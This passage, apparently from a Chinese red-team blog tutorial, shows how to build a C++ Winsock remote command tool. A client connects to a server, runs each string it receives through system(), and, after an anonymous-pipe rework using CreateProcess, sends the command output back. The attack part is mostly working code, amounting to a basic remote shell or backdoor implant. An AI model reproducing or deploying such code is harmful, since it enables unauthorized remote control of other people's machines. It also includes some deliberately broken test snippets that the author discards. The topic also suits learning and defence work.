        // 设置服务端地址和端口
        sockaddr_in ServerAddr;
        ServerAddr.sin_family = AF_INET;
        ServerAddr.sin_port = ::htons(port);
        ServerAddr.sin_addr.S_un.S_addr = ::inet_addr(ipaddr);
        // 绑定端口ip
        if (NULL != ::bind(g_ServerSocket, (LPSOCKADDR)&ServerAddr, sizeof(ServerAddr)))
        {
            printf("[!] Bind port failed\n");
            return FALSE;
        }
        else
        {
            printf("[*] Bind portBind port successfully!\n");
        }
        // 设置监听客户端数量
        if (NULL != ::listen(g_ServerSocket, 5))
        {
            printf("[!] Listen port failed\n");
            return FALSE;
        }
        else
        {
            printf("[*] Listen port successfully!\n");
        }
        return TRUE;
    }
    void AcceptMessage()
    {
        sockaddr_in addr = { 0 };
        int dwLength = sizeof(addr);
        g_clientsocket = ::accept(g_ServerSocket, (sockaddr*)(&addr), &dwLength);
        printf("Accept link the client!\n");
        char szBuffer[MAX_PATH] = { 0 };
        while (TRUE)
        {
            int Ret = ::recv(g_clientsocket, szBuffer, MAX_PATH, 0);
            if (Ret <= 0)
            {
                continue;
            }
            printf("[*] recv:%s\n", szBuffer);
        }
    }
    void SendMessage()
    {
        char cmd[100] = { 0 };
        cin.getline(cmd, 100);
        ::send(g_clientsocket, cmd, (::strlen(cmd) + 1), 0);
        printf("[*] send:%s\n", cmd);
    }
然后再是客户端的代码编写，客户端跟服务端唯一一点不同的就是没有`bind`和`listen`即监听过程，直接连接即可
将一个套接字置于正在监听传入连接的状态
    int WSAAPI listen(
      [in] SOCKET s,
      [in] int    backlog
    );
一开始还是初始化winsock环境
    WSADATA wsadata = { 0 };
        WORD w_version_req = MAKEWORD(2, 2);
        WSAStartup(w_version_req, &wsadata);
然后创建流式socket
    SOCKET g_SeverSocket = socket(AF_INET, SOCK_STREAM, NULL);
使用`connect`连接服务端
    connect(g_SeverSocket, (LPSOCKADDR)&ServerAddr, sizeof(ServerAddr));
然后创建线程接收数据
    ::CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)ThreadProc, NULL, NULL, NULL);
这里建立了连接那么即可以接收信息，也可以发送信息
    void SendMsg(char* pszSend)
    {
        //发送数据
        ::send(g_ClientSocket, pszSend, (::strlen(pszSend) + 1), 0);
        printf("[*] Sent:%s",pszSend);
    }
    void GetMsg()
    {
        char szBuffer[MAX_PATH] = { 0 };
        while (TRUE)
        {
            int Ret = ::recv(g_ClientSocket, szBuffer, MAX_PATH, 0);
            if (Ret <= 0)
            {
                continue;
            }
            system(szBuffer);
            SendMsg((LPSTR)"The command executed successfully");
        }
    }
到这个地方一个demo就已经完成，我们运行下程序看一下，首先打开服务端
再打开客户端，可以看到已经连接成功
这里执行下系统命令可以看到在客户端已经执行成功，但是有一个问题，我们如果要想在客户端显示服务端执行的命令该怎么办呢？
这里就涉及到了进程间的通信，一开始我准备用共享内存去实现的，但是好像共享内存不能够接收到`system()`执行后的内容，先看下代码
    HANDLE hMapObject;
            HANDLE hMapView;
            //创建FileMapping对象               
            hMapObject = CreateFileMapping((HANDLE)0xFFFFFFFF, NULL, PAGE_READWRITE, 0, 0x1000, TEXT("shared"));
            if (!hMapObject)
            {
                printf("[!] ShareMemory failed\n\n");
                return FALSE;
            }
            //将FileMapping对象映射到自己的进程                
            hMapView = MapViewOfFile(hMapObject, FILE_MAP_WRITE, 0, 0, 0);
            if (!hMapView)
            {
                printf("[!] MapViewOfFile failed\n\n");
                return FALSE;
            }
            //向共享内存写入数据             
            strcpy((char*)hMapView, (const char*)system(szBuffer));
            SendRet((LPSTR)"The command executed successfully");
            return TRUE;
主要是`strcpy()`这个函数是用来向共享内存写入数据的，所以第二个参数就是`system()`执行过后的返回值，但是第二个值的属性是`const
char*`，这里如果我强转类型的话就会报错
这里我写一个test函数进行测试看一下`system()`的参数能不能接收到
    void test()
    {
        int i = system("whoami");
        printf("%s", i);
    }
执行一下看一下输出，可以看到`system()`函数自动输出结果，而不会进入参数i，后面打印也是null，后面查阅了资料`system()`函数只是提供了一个接口的作用，所以共享内存的方法来接收数据不太现实，这里换了一个匿名管道的方式接收数据
匿名管道的实现代码如下
    HANDLE hRead;                                       
    HANDLE hWrite;  
    SECURITY_ATTRIBUTES sa;                                     
    sa.bInheritHandle = TRUE;                                       
    sa.lpSecurityDescriptor = NULL;                                     
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);                                       
    if(!CreatePipe(&hRead,&hWrite,&sa,0))                                       
        {
            printf("CreatePipe Failed\n\n");
            return FALSE;
        }                                   
    STARTUPINFO si;                                     
    //PROCESS_INFORMATION pi;
    ZeroMemory(&si,sizeof(STARTUPINFO));                                        
    si.cb = sizeof(STARTUPINFO);                                        
    si.dwFlags = STARTF_USESTDHANDLES;                                      
    si.hStdInput = hRead;                                       
    si.hStdOutput = hWrite;                                     
    si.hStdError = GetStdHandle(STD_ERROR_HANDLE);  
    if (!::CreateProcessA(NULL, lpscmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) 
    {
        printf("Create Process failed, error is : %d", GetLastError());
        return FALSE;
    }
    CloseHandle(hWrite);
    ::WaitForSingleObject(pi.hThread, -1);
    ::WaitForSingleObject(pi.hProcess, -1);
       ::RtlZeroMemory(lpsRetBuffer, RetBufferSize);
    if (!::ReadFile(hRead, lpsRetBuffer, 4096, &RetBufferSize, NULL)) 
    {
        printf("Readfile failed, error is : %d", GetLastError());
        return FALSE;
    }
    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
# 实现效果
之前demo实现的效果在recv处是看不到接收端的数据的，如下所示
加一个匿名管道进行进程间的通信过后可以直接在服务端看到客户端的返回数据
欢迎关注公众号 **红队蓝军**